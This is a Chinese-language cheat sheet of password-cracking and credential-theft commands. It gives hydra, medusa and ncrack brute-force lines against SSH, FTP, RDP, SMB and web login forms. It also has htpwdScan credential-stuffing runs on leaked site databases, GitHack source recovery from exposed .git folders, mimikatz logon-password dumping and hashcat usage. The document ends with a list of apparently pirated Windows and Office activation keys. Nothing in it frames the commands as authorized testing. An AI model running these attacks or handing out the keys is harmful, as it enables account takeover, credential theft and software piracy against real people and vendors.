john hydra htpwdScan GitHack wifiphisher fcrackzip 破解工具
==========

john安装：
```sh
wget http://www.openwall.com/john/j/john-1.8.0.tar.gz
tar xzvf john-1.8.0.tar.gz
cd john-1.8.0/src/
make
make clean linux-x86-64
cd ../run/
./john --test
./john hcpasswd
```

hydra安装：
```
apt-get install apt-get install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird2.1-dev libncp-dev libncurses5-dev hydra
brew install hydra
yum install openssl-devel pcre-devel ncpfs-devel postgresql-devel libssh-devel subversion-devel libncurses-devel -y
zypper install libopenssl-devel pcre-devel libidn-devel ncpfs-devel libssh-devel postgresql-devel subversion-devel libncurses-devel
# wget http://www.thc.org/releases/hydra-7.4.1.tar.gz
# tar zxvf hydra-7.4.1.tar.gz
# cd hydra-7.4.1
# ./configure
# make && make install

hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]
-R 继续从上一次进度接着破解
-S 大写，采用SSL链接
-s <PORT> 小写，可通过这个参数指定非默认端口
-l <LOGIN> 指定破解的用户，对特定用户破解
-L <FILE> 指定用户名字典
-p <PASS> 小写，指定密码破解，少用，一般是采用密码字典
-P <FILE> 大写，指定密码字典
-e <ns> 可选选项，n：空密码试探，s：使用指定用户和密码试探
-C <FILE> 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数
-M <FILE> 指定目标列表文件一行一条
-o <FILE> 指定结果输出文件
-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解
-t <TASKS> 同时运行的线程数，默认为16
-w <TIME> 设置最大超时的时间，单位秒，默认是30s
-v / -V 显示详细过程
server 目标ip
service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等
OPT 可选项

#破解ssh
hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh
也可以使用 -o 选项指定结果输出文件。
hydra -L users.txt -P password.txt -t 1 -vV -e ns -o save.log 192.168.1.104 ssh
破解ftp：
# hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
# hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
get方式提交，破解web登录：
　　# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
　　# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
post方式提交，破解web登录：
　　该软件的强大之处就在于支持多种协议的破解，同样也支持对于web用户界面的登录破解，get方式提交的表单比较简单，这里通过post方式提交密码破解提供思路。该工具有一个不好的地方就是，如果目标网站登录时候需要验证码就无法破解了。带参数破解如下：
<form action="index.php" method="POST">
<input type="text" name="name" /><BR><br>
<input type="password" name="pwd" /><br><br>
<input type="submit" name="sub" value="提交">
</form>
　　假设有以上一个密码登录表单，我们执行命令：
# hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form "index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>"
破解https：
# hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https
破解teamspeak：
# hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
破解cisco：
# hydra -P pass.txt 10.36.16.18 cisco
# hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable
破解smb：
# hydra -l administrator -P pass.txt 10.36.16.18 smb
破解pop3：
# hydra -l muts -P pass.txt my.pop3.mail pop3
破解rdp：
# hydra ip rdp -l administrator -P pass.txt -V
破解http-proxy：
# hydra -l admin -P pass.txt http-proxy://10.36.16.18
破解imap：
# hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
# hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
破解telnet
# hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V
破解3389
hydra -t 4 -V -l administrator -P 500-worst-passwords.txt rdp://192.168.1.102
curl --referer http://host/login.aspx --data "password=1111&account=111" http://host/ajax/login.ashx
hydra -t 4 -V -l admin -P 500-worst-passwords.txt host http-post-form "/ajax/login.ashx:txtAccount=^USER^&txtPassword=^PASS^:S=0:H=Referer\: http\://host/login.aspx"
```

htpwdScan安装：
```
git clone https://github.com/lijiejie/htpwdScan.git
cd htpwdScan
#HTTP Basic认证
./htpwdScan.py -u=http://auth.58.com/ -basic user.txt password.txt
#表单破解
htpwdScan.py -f post2.txt -d user=user.txt passwd=password.txt -err="success\":false"
#GET参数破解
htpwdScan.py -d passwd=password.txt -u="http://xxx.com/index.php?m=login&username=test&passwd=test" -get -err="success\":false"
#撞库攻击
htpwdScan.py -f=post.txt -database loginname,passwd=xiaomi.txt -regex="(\S+)\s+(\S+)" -err="用户名或密码错误" -fip
htpwdScan.py -f=post.txt -database passwd,loginname=csdn.net.sql -regex="\S+ # (\S+) # (\S+)" -err="用户名或密码错误" -fip
#校验HTTP代理
htpwdScan.py -f=post.txt -proxylist=proxies.txt -checkproxy -suc="用户名或密码错误"
htpwdScan.py -u=http://www.baidu.com -get -proxylist=available.txt -checkproxy -suc="百度一下"
```

GitHack .git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码
```
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
./GitHack.py http://www.openssl.org/.git/
```

medusa http://foofus.net/goons/jmk/medusa/medusa.html
```
medusa -h 192.168.0.20 -u administrator -P passwords.txt -e ns -M smbnt
medusa -H hosts.txt -U users.txt -P passwords.txt -T 20 -t 10 -L -F -M smbnt
medusa -M smbnt -C combo.txt
```

ncrack
```
破解3389
ncrack -u administrator -P 500-worst-passwords.txt -p 3389 192.168.1.102
```

fcrackzip
```
zip -P hujhh test.zip test1.txt test2,txt
fcrackzip -v -b -u -c a -p aaaaa test.zip
```

win mimikatz https://github.com/gentilkiwi/mimikatz/releases/download/2.0.0-alpha-20151113/mimikatz_trunk.zip
```
privilege::debug
sekurlsa::logonpasswords
```

hashcat安装：
```sh
brew install hashcat
hashcat -t 32 -a 7 example0.hash ?a?a?a?a example.dict
cat example.dict | ./hashcat -m 400 example400.hash
hashcat -m 500 example500.hash example.dict
```

win7 win8.1 win10 office2013 key
```
友情提示：次数为0的适用于电话激活，有次数的在线联网激活
Windows10 专业版/企业版 技术预览版密钥：
Win10企业版密钥：
[Key]：VTNMT-2FMYP-QCY43-QR9VK-WTVCK
[Key]：PBHCJ-Q2NYD-2PX34-T2TD6-233PK
Win10专业版密钥：
[Key]：6P99N-YF42M-TPGBG-9VMJP-YKHCF
[Key]：NKJFK-GPHP7-G8C3J-P6JXR-HQRJR

Windows8.1 | Windows 8.1 Update 专业版/企业版 MAK激活密钥：
[Key]：BHWQB-M4NKQ-MMW2D-KV96X-8QJK3 [剩余次数：0]
[Key]：BJVNV-XWW4D-42KT7-239JW-82M93 [剩余次数：0]
[Key]：NDDQW-6FF9W-D3FCG-WV3K6-QYGVD [剩余次数：0]
[Key]：VN387-9FYQV-C7JQK-T98MC-9P9HD [剩余次数：0]

Windows7 SP1 专业版/企业版 MAK激活密钥：
[Key]：J2WGT-WMCC2-JHQPX-M7XTM-3RWMK [剩余次数：1000+]
[Key]：9GW7Y-2V62H-7XM4C-6RWMX-88KBH [剩余次数：1000+]
[Key]：J3RQW-CQVT9-MF44G-3G6JF-V6CCV [剩余次数：500+]
[Key]：GJHJP-GCJBW-7BW74-XJGCF-VTRPR [剩余次数：200+]
[Key]：J7GFT-BDTWH-287FT-J8KYM-KTRGV [剩余次数：100+]
[Key]：HRC3W-9BJPT-GFH7K-WMCWG-9KXT9 [剩余次数：100+]

Office 2013 系列 MAK激活密钥：
Office 2013 Pro Plus Vol 版MAK激活密钥：
[Key]：RD82N-HTYYT-MQYDY-FDFF9-HCCDH [剩余次数：0]
[Key]：8XBN8-X4WTW-J96JJ-R3FRF-K4P9V [剩余次数：30+]
[Key]：N9JBX-RKWRV-K4TF9-H7FR6-GMQ67 [剩余次数：10+]
[Key]：2MDGV-NWQ78-2QGHB-GD849-HCCDH [剩余次数：0]
[Key]：PNT6B-DKH2Q-GW4J2-DDT6T-PDHT7 [剩余次数：0]
[Key]：XNB47-HXQJB-FKHYQ-CB9K7-XD43H [剩余次数：0]
[Key]：NFJ7D-BVV9C-4DFV9-FKPM6-VCCDH [剩余次数：0]
[Key]：GC288-NVPMT-GWF2M-76228-W42DH [剩余次数：0]
[Key]：VYGR7-N32TB-BHGF9-F8G7G-QYF3H [剩余次数：0]
[Key]：K7F82-XNPXG-3BG6C-TV7M4-3C8QH [剩余次数：0]
[Key]：BDNKQ-C9WYP-PJM3Q-YGJJV-M4D67 [剩余次数：0]
[Key]：C73NV-GKMYD-TC2X2-DT7JC-XTKKV [剩余次数：0]
[Key]：7DMWV-PN6MV-2DTTQ-JQFGF-VMF3H [剩余次数：0]
[Key]：BNQWW-X4422-FCXD8-JPT37-PWC9V [剩余次数：0]
[Key]：NGKV3-93PXJ-87G6M-K8R9Q-9D43H [剩余次数：0]
[Key]：6N667-BMRDR-T2WMM-2RMQ9-DYF3H [剩余次数：0]
[Key]：R9TB4-N3R6G-FYX9D-QQV9Q-VXJQH [剩余次数：0]
[Key]：78N9G-RRHJP-CXB8P-K4GPT-MKJQH [剩余次数：0]
[Key]：MNTPC-622BF-7WCVM-XBYGD-H2XKV [剩余次数：0]

Office 2010 系列 MAK激活密钥：
Office 2010 ProPlusVL MAK激活密钥：
[Key]：7KPY9-KWRD9-6FW2X-BWGHW-23684 [剩余次数：1000+]
[Key]：PQKW6-6QGMK-DTTT6-TRRYD-HP76J [剩余次数：1000+]
```